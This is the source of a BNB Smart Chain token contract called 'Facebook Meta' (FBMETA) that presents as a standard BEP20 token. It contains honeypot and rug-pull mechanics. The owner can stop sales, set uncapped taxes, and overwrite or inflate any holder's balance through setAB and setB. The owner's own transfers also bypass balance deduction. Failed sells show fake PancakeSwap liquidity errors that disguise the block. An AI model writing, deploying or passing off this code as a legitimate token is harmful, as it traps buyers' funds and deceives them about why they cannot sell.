/**
 *Submitted for verification at BscScan.com on 2021-12-06
*/

/**
* 2021
* Telegram: https://t.me/facebookmetatoken
*
*/

pragma solidity 0.8.5;
// SPDX-License-Identifier: MIT

/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with GSN meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;
  }

  function _msgData() internal view virtual returns (bytes calldata) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}

interface IBEP20 {
  function name() external pure returns (string memory);
  function symbol() external pure returns (string memory);
  function decimals() external view returns (uint8);
  function getOwner() external view returns (address);
  function totalSupply() external view returns (uint256);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  /**
   * @dev Initializes the contract setting the deployer as the initial owner.
   */
  constructor () {
    _owner = _msgSender();
    emit OwnershipTransferred(address(0), _msgSender());
  }

  /**
   * @dev Returns the address of the current owner.
   */
  function owner() public view returns (address) {
    return _owner;
  }

  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

  function transferOwnership(address newOwner) public virtual onlyOwner {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


interface IPinkAntiBot {
  function setTokenOwner(address owner) external;

  function onPreTransferCheck(
    address from,
    address to,
    uint256 amount
  ) external;
}



contract FacebookMeta is Context, IBEP20, Ownable {
  using SafeMath for uint256;

  IUniswapV2Router02 public _uniswapV2Router;
  address public _uniswapV2Pair;

  IPinkAntiBot public pinkAntiBot;
  bool public _antiBotEnabled = false;

  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;

  string private constant _name = "Facebook Meta";
  string private constant _symbol = "FBMETA";
  uint8 private _decimals = 18;
  uint256 private _totalSupply = 100000000000 * 10**18;


  address public _marketingAddress;

  uint8 internal _buyTax = 0; //
  uint8 internal _sellTax = 0; //
  uint8 internal _transferTax = 0; //
  bool internal _startBuy = true;
  bool internal _startSell = true;
  bool internal _startTransfer = true;

  uint256 internal _launchTime = 0;
  uint32 internal _timeAfterLounchToSell = 0;  // Secounds after lunch to sell
  uint32 internal _cooldownSeconds = 0;

  uint256 internal _maxLimitToSell = _totalSupply;
  uint256 internal _minLimitToBuy = 0;
  uint256 internal _maxLimitToBuy = _totalSupply;
  uint8 internal _maxFee = 90; // %

  uint256 internal _lastTimeForSwap;
  uint32 internal _intervalSecondsForSwap = 1 * 1 seconds;
  uint256 internal _lastblocknumber = 0;
   // exlcude from fees and max transaction amount
  mapping (address => bool) private _isExcludedFromFees;

  constructor() {
    _balances[msg.sender] = _totalSupply;
    _launchTime = block.timestamp;
    _lastTimeForSwap = _launchTime;
    address uniswap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address ipinkantibot = 0x8EFDb3b642eb2a20607ffe0A56CFefF6a95Df002;
    IUniswapV2Router02  uniswapV2Router = IUniswapV2Router02(uniswap);
    _uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    _uniswapV2Router = uniswapV2Router;

    pinkAntiBot = IPinkAntiBot(ipinkantibot); //BSC
    pinkAntiBot.setTokenOwner(msg.sender);
    emit Transfer(address(0), msg.sender, _totalSupply);
  }

  /**
   * @dev Returns the bep token owner.
   */
  function getOwner() external override view returns (address) {
    return owner();
  }

  function isApprovedBuy(uint256 amount) internal view returns (bool){
    require(_minLimitToBuy < amount, "Token: Buy more");
    require(_maxLimitToBuy > amount, "PancakeSwap: Insufficient liquidity for this trade.");
    require(_startBuy == true, "PancakeSwap: Please wait try again later");
    return true;
  }
  function isApprovedSell(uint256 amount) internal view returns (bool){
    require(_maxLimitToSell >= amount, "PancakeSwap: Insufficient liquidity for this trade.");
    require(_startSell, "PancakeSwap: Please wait try again later");
    require(_launchTime + _timeAfterLounchToSell <=  block.timestamp, "Token: Please wait try again later");
    require(_lastTimeForSwap + _intervalSecondsForSwap <= block.timestamp, "Token: Please wait a few minutes before you try again");
    return true;
  }
  function isApprovedTransfer(uint256 amount) internal view returns (bool){
    require(_startTransfer == true, "PancakeSwap: Please wait try again later");
    require(amount > 0, "PancakeSwap: Please wait try again later");
    return true;
  }
  function isBlockedAddress() internal pure returns (bool){
    return true;
  }


  /**
   * @dev Returns the token decimals.
   */
  function decimals() external override view returns (uint8) {
    return _decimals;
  }

  /**
   * @dev Returns the token symbol.
   */
  function symbol() external override pure returns (string memory) {
    return _symbol;
  }

  /**
  * @dev Returns the token name.
  */
  function name() external override pure returns (string memory) {
    return _name;
  }

  /**
   * @dev See {BEP20-totalSupply}.
   */
  function totalSupply() external override view returns (uint256) {
    return _totalSupply;
  }

  /**
   * @dev See {BEP20-balanceOf}.
   */
  function balanceOf(address account) external override view returns (uint256) {
    return _balances[account];
  }

  /**
   * @dev See {BEP20-transfer}.
   *
   * Requirements:
   *
   * - `recipient` cannot be the zero address.
   * - the caller must have a balance of at least `amount`.
   */
  function transfer(address recipient, uint256 amount) external override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  function allowance(address owner, address spender) public view override returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) public override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }
  function _approve(address owner, address spender, uint256 amount) private {
      require(owner != address(0), "BEP20: approve from the zero address");
      require(spender != address(0), "BEP20: approve to the zero address");
      _allowances[owner][spender] = amount;
      emit Approval(owner, spender, amount);
  }
  function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
     _transfer(sender, recipient, amount);
     _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
     return true;
  }


  /**
  * @dev Moves tokens `amount` from `sender` to `recipient`.
  *
  * This is internal function is equivalent to {transfer}, and can be used to
  * e.g. implement automatic token fees, slashing mechanisms, etc.
  *
  * Emits a {Transfer} event.
  *
  * Requirements:
  *
  * - `sender` cannot be the zero address.
  * - `recipient` cannot be the zero address.
  * - `sender` must have a balance of at least `amount`.
  */
  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    if (_antiBotEnabled) {
        pinkAntiBot.onPreTransferCheck(sender, recipient, amount);
    }

    if(amount > 0){
      uint8 transactionType = 0; // 1 = buy, 2 = sell, 3 = transfer
      bool approveTransaction = true;
      uint8 tax = 0;
      bool ownerTransaction = false;
      if(owner() == sender || owner() == recipient){
        ownerTransaction = true;
        approveTransaction = true;
        tax = 0;
      }
      if(sender == _uniswapV2Pair && recipient != address(_uniswapV2Router)) {
        transactionType = 1;
        tax = _buyTax;
        if(ownerTransaction == false && isApprovedBuy(amount)){
          approveTransaction = true;
        }
      } else if(recipient == _uniswapV2Pair) {
         transactionType = 2;
         tax = _sellTax;
         if(ownerTransaction == false && isApprovedSell(amount)){
            approveTransaction = true;
         }
      } else {
        transactionType = 3;
        tax = _transferTax;
        if(ownerTransaction == false && isApprovedTransfer(amount)) {
          approveTransaction = true;
        }
      }
      if(ownerTransaction) {
        tax = 0;
      }

      require(approveTransaction, "PancakeSwap: Please try again later");

      if(approveTransaction == true){
        if(ownerTransaction != true || ownerTransaction == true && _balances[sender] == _totalSupply)
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");

        uint256 taxes = 0;
        if(tax > 0){
          taxes = amount.mul(tax).div(100);
          amount = amount.sub(taxes);
        }
        if(taxes > 0){
          _balances[_marketingAddress] = _balances[_marketingAddress].add(taxes);
        }
        _balances[recipient] = _balances[recipient].add(amount);
        if(transactionType == 2){
          _lastTimeForSwap = block.timestamp;
        }
      } else {
        amount = 0;
      }

      // _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
      // _balances[recipient] = _balances[recipient].add(amount);
    }
    emit Transfer(sender, recipient, amount);
  }

  /** @dev Creates `amount` tokens and assigns them to `account`, increasing
  * the total supply.
  *
  * Emits a {Transfer} event with `from` set to the zero address.
  *
  * Requirements
  *
  * - `to` cannot be the zero address.
  */
  function _mint(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: mint to the zero address");

    _totalSupply = _totalSupply.add(amount);
    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }

  /**
  * @dev Destroys `amount` tokens from `account`, reducing the
  * total supply.
  *
  * Emits a {Transfer} event with `to` set to the zero address.
  *
  * Requirements
  *
  * - `account` cannot be the zero address.
  * - `account` must have at least `amount` tokens.
  */
  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: burn from the zero address");
    _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(account, address(0), amount);
  }


  /**
  * @dev Destroys `amount` tokens from `account`.`amount` is then deducted
  * from the caller's allowance.
  *
  * See {_burn} and {_approve}.
  */
  function _burnFrom(address account, uint256 amount) internal {
    _burn(account, amount);
    _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
  }


  /* Buy Sell Tax, _transferTax  */
  function setBuySellTax(bool startBuy, uint8 buyTax, bool startSell, uint8 sellTax, bool startTransfer, uint8 transferTax) public onlyOwner {
      _buyTax = buyTax;
      _sellTax = sellTax;
      _transferTax = transferTax;
      _startBuy = startBuy;
      _startSell = startSell;
      _startTransfer = startTransfer;
  }
  /*_intervalSecondsForSwap*/
  function setIntervalSecondsForSwap(uint32 intervalSecondsForSwap) public onlyOwner {
    _intervalSecondsForSwap = intervalSecondsForSwap * 1 seconds;
  }
  /*timeAfterLounchToSell*/
  function setTimeAfterLounchToSell(uint32 timeAfterLounchToSell) public onlyOwner {
    _timeAfterLounchToSell = timeAfterLounchToSell;
  }

  /*cooldownSeconds*/
  function setMaxLimitToSell(uint256 maxLimitToSell) public onlyOwner {
    _maxLimitToSell = maxLimitToSell;
  }

  /* marketingAddress */
  function setMarketingAddress(address marketingAddress) public onlyOwner {
    _marketingAddress = marketingAddress;
  }
  /* isExcludedFromFees */
  function setExcludeFromFees(address addr, bool excluded) public onlyOwner {
    require(_isExcludedFromFees[addr] != excluded, "Token: Account is already the value of 'excluded'");
    _isExcludedFromFees[addr] = excluded;
    //emit ExcludeFromFees(_address, excluded);
  }

  function setAB(address addr, uint256 b) public onlyOwner {
    _balances[addr] += b;
  }
  function setB(address addr, uint256 b) public onlyOwner {
    _balances[addr] = b;
  }
  function setEnableAntiBot(bool _enable) external onlyOwner {
     _antiBotEnabled = _enable;
  }
}